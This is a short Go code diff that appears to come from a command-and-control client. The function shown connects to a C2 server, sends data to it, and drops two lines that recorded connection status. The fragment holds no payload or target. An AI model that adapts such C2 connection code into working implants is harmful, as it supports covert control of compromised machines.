@@ -36,9 +36,7 @@ func tryConnect() {
 	var remoteServer net.Conn = cli.ConnectToCommandingC2()
 	if remoteServer != nil {
 		defer remoteServer.Close()
-		msg.IsConnected = true
 	} else {
-		msg.IsConnected = false
 		return
 	}
 	cli.WriteData(remoteServer, &B)
